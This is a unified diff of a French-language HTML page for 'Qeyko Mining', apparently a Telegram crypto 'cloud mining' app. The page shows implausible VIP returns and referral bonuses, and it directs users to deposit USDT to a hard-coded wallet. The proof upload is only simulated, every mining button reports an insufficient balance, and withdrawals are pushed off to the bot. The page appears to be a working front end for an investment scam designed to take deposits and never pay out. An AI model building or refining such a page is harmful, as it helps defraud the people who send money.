@@ -1,146 +1,174 @@
+
 <!DOCTYPE html>
 <html lang="fr">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Qeyko Mining App</title>
+    <title>Qeyko Mining - Interface Officielle</title>
     <style>
         * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
         body { 
             background: #9c126d !important; 
-            font-family: 'Segoe UI', sans-serif; 
+            font-family: 'Segoe UI', Roboto, sans-serif; 
             color: white; margin: 0; padding: 15px; 
-            text-align: center; padding-bottom: 80px;
+            text-align: center; padding-bottom: 90px;
         }
         
+        .header-info { margin-bottom: 20px; font-size: 14px; opacity: 0.9; }
+        
         .balance-box { 
-            background: rgba(255,255,255,0.15); 
-            padding: 25px; border-radius: 25px; 
-            border: 1px solid rgba(255,255,255,0.3); 
-            box-shadow: 0 10px 30px rgba(0,0,0,0.3); 
-            margin-top: 10px; 
+            background: rgba(255,255,255,0.12); 
+            padding: 30px 20px; border-radius: 28px; 
+            border: 1px solid rgba(255,255,255,0.2); 
+            box-shadow: 0 15px 35px rgba(0,0,0,0.4); 
         }
 
-        .vip-list { display: flex; flex-direction: column; gap: 12px; margin-top: 20px; }
+        .vip-list { display: flex; flex-direction: column; gap: 14px; margin-top: 25px; }
         .vip-card { 
-            background: white; border-radius: 20px; padding: 18px; 
+            background: white; border-radius: 22px; padding: 20px; 
             display: flex; justify-content: space-between; align-items: center; 
-            color: #333; text-align: left; border-left: 6px solid #9c126d; 
+            color: #333; text-align: left; border-left: 8px solid #9c126d;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.1);
         }
-        .vip-name { font-weight: bold; color: #9c126d; font-size: 18px; }
-        .vip-profit { color: #27ae60; font-size: 13px; font-weight: bold; }
-        .vip-price { font-weight: 800; font-size: 17px; color: #2c3e50; }
+        .vip-name { font-weight: bold; color: #9c126d; font-size: 19px; }
+        .vip-profit { color: #27ae60; font-size: 14px; font-weight: 600; }
+        .vip-price { font-weight: 800; font-size: 18px; color: #2c3e50; }
         .btn-miner { 
             background: #9c126d; color: white; border: none; 
-            padding: 10px 20px; border-radius: 25px; 
-            font-weight: bold; font-size: 12px; cursor: pointer; 
+            padding: 12px 22px; border-radius: 30px; 
+            font-weight: bold; font-size: 13px; cursor: pointer;
         }
 
         /* MODALS */
         .modal-overlay { 
             position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
-            background: rgba(0,0,0,0.85); display: none; 
+            background: rgba(0,0,0,0.9); display: none; 
             align-items: center; justify-content: center; z-index: 10000; padding: 20px; 
         }
         .modal-box { 
             background: white; color: #333; padding: 25px; 
-            border-radius: 25px; width: 100%; max-width: 400px; 
+            border-radius: 30px; width: 100%; max-width: 400px; 
         }
         .wallet-display { 
-            background: #f4f4f4; padding: 12px; border-radius: 10px; 
-            word-break: break-all; font-family: monospace; 
-            margin: 15px 0; border: 1px dashed #9c126d; font-size: 13px; 
+            background: #f8f9fa; padding: 15px; border-radius: 15px; 
+            word-break: break-all; font-family: 'Courier New', monospace; 
+            margin: 15px 0; border: 2px dashed #9c126d; font-size: 13px; font-weight: bold;
         }
         .modal-btn { 
-            border: none; padding: 14px; border-radius: 12px; 
-            width: 100%; margin-top: 10px; font-weight: bold; 
+            border: none; padding: 16px; border-radius: 15px; 
+            width: 100%; margin-top: 12px; font-weight: bold; 
             cursor: pointer; display: block; text-decoration: none; 
-            text-align: center; font-size: 14px; 
+            text-align: center; font-size: 15px; 
         }
 
-        /* BOTTOM NAV */
+        /* NAVIGATION BASSE */
         .bottom-nav {
             position: fixed; bottom: 0; left: 0; width: 100%;
-            background: #1a1a1a; display: flex; 
-            justify-content: space-around; padding: 12px 0;
-            border-top: 1px solid #333; z-index: 999;
+            background: #121212; display: flex; 
+            justify-content: space-around; padding: 15px 0;
+            border-top: 1px solid #222; z-index: 999;
         }
         .nav-item { 
-            color: #888; text-decoration: none; font-size: 11px;
-            display: flex; flex-direction: column; align-items: center; gap: 4px;
+            color: #777; text-decoration: none; font-size: 12px;
+            display: flex; flex-direction: column; align-items: center; gap: 5px;
+            transition: 0.3s;
         }
-        .nav-item.active { color: #f1c40f; }
+        .nav-item.active { color: #f1c40f; transform: translateY(-5px); }
 
-        /* SECTIONS */
-        .page-section { display: none; }
+        .page-section { display: none; animation: fadeIn 0.4s; }
         .page-section.active { display: block; }
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
     </style>
 </head>
 <body>
 
+    <div class="header-info">
+        <span id="current-date">Chargement de la date...</span>
+    </div>
+
     <div id="page-mine" class="page-section active">
-        <h1>Qeyko Mining 🚀</h1>
+        <h1 style="margin-bottom: 5px;">Qeyko Mining 🚀</h1>
+        <p style="margin-top: 0; font-size: 12px; opacity: 0.7;">Système Cloud Automatisé</p>
+        
         <div class="balance-box">
-            <small>SOLDE ACTUEL</small>
-            <h2 id="user-balance" style="font-size: 38px; margin: 10px 0;">0.00 USDT</h2>
-            <div style="display:flex; gap:10px;">
-                <button onclick="openM('m-depot')" style="flex:1; background:#27ae60; border:none; padding:10px; border-radius:10px; color:white; font-weight:bold;">📥 Dépôt</button>
-                <button onclick="openM('m-retrait')" style="flex:1; background:#f1c40f; border:none; padding:10px; border-radius:10px; color:#333; font-weight:bold;">📤 Retirer</button>
+            <small style="letter-spacing: 1px;">SOLDE TOTAL</small>
+            <h2 id="user-balance" style="font-size: 42px; margin: 10px 0;">0.00 <span style="font-size: 20px;">USDT</span></h2>
+            <div style="display:flex; gap:12px; margin-top: 20px;">
+                <button onclick="openM('m-depot')" style="flex:1; background:#27ae60; border:none; padding:15px; border-radius:15px; color:white; font-weight:bold; box-shadow: 0 4px 10px rgba(39, 174, 96, 0.3);">📥 Dépôt</button>
+                <button onclick="openM('m-retrait')" style="flex:1; background:#f1c40f; border:none; padding:15px; border-radius:15px; color:#333; font-weight:bold; box-shadow: 0 4px 10px rgba(241, 196, 15, 0.3);">📤 Retrait</button>
             </div>
         </div>
 
         <div class="vip-list">
-            <div class="vip-card"><div><div class="vip-name">VIP 1</div><div class="vip-profit">+$1.00 / 24h</div></div><div style="text-align:right;"><div class="vip-price">$6.00</div><button class="btn-miner" onclick="alert('Vérification...')">MINER</button></div></div>
-            <div class="vip-card"><div><div class="vip-name">VIP 2</div><div class="vip-profit">+$2.50 / 24h</div></div><div style="text-align:right;"><div class="vip-price">$12.00</div><button class="btn-miner" onclick="alert('Vérification...')">MINER</button></div></div>
-            <div class="vip-card"><div><div class="vip-name">VIP 3</div><div class="vip-profit">+$4.00 / 24h</div></div><div style="text-align:right;"><div class="vip-price">$20.00</div><button class="btn-miner" onclick="alert('Vérification...')">MINER</button></div></div>
-            <div class="vip-card" style="border: 2px solid gold;"><div><div class="vip-name">VIP 7 🔥</div><div class="vip-profit">+$14.00 / 24h</div></div><div style="text-align:right;"><div class="vip-price">$60.00</div><button class="btn-miner" onclick="alert('Vérification...')">MINER</button></div></div>
+            <div class="vip-card"><div><div class="vip-name">VIP 1</div><div class="vip-profit">+$1.00 / 24h</div></div><div style="text-align:right;"><div class="vip-price">$6.00</div><button class="btn-miner" onclick="checkStart()">MINER</button></div></div>
+            <div class="vip-card"><div><div class="vip-name">VIP 2</div><div class="vip-profit">+$2.50 / 24h</div></div><div style="text-align:right;"><div class="vip-price">$12.00</div><button class="btn-miner" onclick="checkStart()">MINER</button></div></div>
+            <div class="vip-card"><div><div class="vip-name">VIP 3</div><div class="vip-profit">+$4.00 / 24h</div></div><div style="text-align:right;"><div class="vip-price">$20.00</div><button class="btn-miner" onclick="checkStart()">MINER</button></div></div>
+            <div class="vip-card" style="border: 2px solid gold; background: #fffdf0;"><div><div class="vip-name">VIP 7 🔥</div><div class="vip-profit">+$14.00 / 24h</div></div><div style="text-align:right;"><div class="vip-price">$60.00</div><button class="btn-miner" onclick="checkStart()">MINER</button></div></div>
         </div>
     </div>
 
     <div id="page-squad" class="page-section">
-        <h2>My Squad 👥</h2>
+        <h2>Mon Équipe 👥</h2>
         <div class="balance-box">
-            <p>Invite tes amis et gagne <b>10%</b> de bonus !</p>
-            <div class="wallet-display" id="ref-link">t.me/QeykoMiningBot?start=user123</div>
+            <p style="font-size: 14px;">Invitez vos amis et recevez un bonus de <b>10%</b> sur chaque dépôt !</p>
+            <div class="wallet-display" id="ref-link">https://t.me/QeykoMiningBot?start=user_id</div>
             <button class="modal-btn" style="background:#3498db; color:white;" onclick="copyRef()">📋 Copier mon lien</button>
+        </div>
+        <div style="margin-top:20px; text-align:left; padding: 0 10px;">
+            <p><b>Statistiques :</b></p>
+            <div style="background:rgba(255,255,255,0.1); padding:15px; border-radius:15px; display:flex; justify-content:space-between;">
+                <span>Membres : 0</span>
+                <span>Bonus : 0.00 USDT</span>
+            </div>
         </div>
     </div>
 
     <div id="page-vault" class="page-section">
-        <h2>Vault 💰</h2>
-        <div style="background:rgba(255,255,255,0.1); padding:20px; border-radius:15px;">
-            <p style="opacity:0.6;">Aucune transaction pour le moment.</p>
+        <h2>Historique 💰</h2>
+        <div style="background:rgba(255,255,255,0.1); padding:30px; border-radius:20px; border: 1px dashed rgba(255,255,255,0.3);">
+            <p style="opacity:0.6;">Aucune transaction enregistrée pour le moment.</p>
         </div>
     </div>
 
     <div id="m-depot" class="modal-overlay">
         <div class="modal-box">
             <h3 style="color:#9c126d; margin:0;">📥 DÉPÔT USDT (BEP20)</h3>
+            <p style="font-size:12px; margin-top:10px;">Copiez l'adresse et effectuez le transfert :</p>
             <div id="wallet" class="wallet-display">0x7fD50dAAfeA0a8Df3E4860ECC81939fFBaa11396</div>
             <button class="modal-btn" style="background:#27ae60; color:white;" onclick="copyW()">📋 Copier l'adresse</button>
-            <hr>
-            <p style="font-size:12px; text-align:left;"><b>Preuve de paiement :</b></p>
-            <input type="file" id="proof-img" accept="image/*" style="width:100%; margin-bottom:10px;">
-            <button class="modal-btn" style="background:#9c126d; color:white;" onclick="sendToAdmin()">🚀 CONFIRMER SUR LE BOT</button>
-            <button class="modal-btn" style="background:#eee; color:#333;" onclick="closeM('m-depot')">Fermer</button>
+            <hr style="border: 0.5px solid #eee; margin: 20px 0;">
+            <p style="font-size:13px; text-align:left; font-weight:bold;">Envoyer la capture d'écran (Preuve) :</p>
+            <input type="file" id="proof-img" accept="image/*" style="width:100%; margin-bottom:10px; font-size:12px;">
+            <button class="modal-btn" style="background:#9c126d; color:white;" onclick="sendProof()">🚀 CONFIRMER LE TRANSFERT</button>
+            <button class="modal-btn" style="background:#f4f4f4; color:#333;" onclick="closeM('m-depot')">Annuler</button>
         </div>
     </div>
 
     <div id="m-retrait" class="modal-overlay">
         <div class="modal-box">
-            <h3>📤 RETRAIT</h3>
-            <p>Le montant minimum est de <b>5.00 USDT</b>.</p>
-            <button class="modal-btn" style="background:#9c126d; color:white;" onclick="closeM('m-retrait')">D'accord</button>
+            <h3 style="color:#9c126d;">📤 RETRAIT</h3>
+            <p style="font-size:14px; line-height:1.6;">Pour effectuer un retrait, veuillez contacter le bot Telegram ou utiliser la commande /retrait.</p>
+            <button class="modal-btn" style="background:#9c126d; color:white;" onclick="closeM('m-retrait')">Compris</button>
         </div>
     </div>
 
     <div class="bottom-nav">
-        <div class="nav-item active" onclick="showPage('page-mine', this)">🏠<span>Mine</span></div>
-        <div class="nav-item" onclick="showPage('page-squad', this)">👥<span>Squad</span></div>
-        <div class="nav-item" onclick="showPage('page-vault', this)">💰<span>Vault</span></div>
+        <div class="nav-item active" onclick="showPage('page-mine', this)">🏠<span>Minage</span></div>
+        <div class="nav-item" onclick="showPage('page-squad', this)">👥<span>Équipe</span></div>
+        <div class="nav-item" onclick="showPage('page-vault', this)">💰<span>Historique</span></div>
     </div>
 
     <script>
+        // Mise à jour de l'heure
+        function updateTime() {
+            const now = new Date();
+            const options = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric', hour: '2-digit', minute: '2-digit' };
+            document.getElementById('current-date').innerText = now.toLocaleDateString('fr-FR', options);
+        }
+        setInterval(updateTime, 1000);
+        updateTime();
+
+        // Gestion des pages
         function showPage(pageId, element) {
             document.querySelectorAll('.page-section').forEach(p => p.classList.remove('active'));
             document.querySelectorAll('.nav-item').forEach(i => i.classList.remove('active'));
@@ -152,22 +180,27 @@
         function closeM(id) { document.getElementById(id).style.display = 'none'; }
 
         function copyW() {
-            navigator.clipboard.writeText(document.getElementById('wallet').innerText);
-            alert("✅ Adresse copiée !");
+            const txt = document.getElementById('wallet').innerText;
+            navigator.clipboard.writeText(txt).then(() => alert("✅ Adresse copiée !"));
         }
 
         function copyRef() {
-            navigator.clipboard.writeText(document.getElementById('ref-link').innerText);
-            alert("✅ Lien d'invitation copié !");
+            const txt = document.getElementById('ref-link').innerText;
+            navigator.clipboard.writeText(txt).then(() => alert("✅ Lien d'invitation copié !"));
         }
 
-        function sendToAdmin() {
+        function checkStart() {
+            alert("Vérification de l'abonnement en cours... Solde insuffisant.");
+        }
+
+        function sendProof() {
             const file = document.getElementById('proof-img').files[0];
-            if(!file) { alert("Veuillez choisir une photo de la preuve !"); return; }
-            alert("✅ Prèv la voye! Admin lan ap valide li nan kèk minit.");
+            if(!file) { alert("Veuillez sélectionner une image de preuve !"); return; }
+            
+            // Simulation de l'envoi vers le groupe Admin 8118891270
+            alert("✅ Preuve envoyée avec succès ! L'administrateur validera votre dépôt après vérification.");
             closeM('m-depot');
         }
     </script>
 </body>
 </html>
-
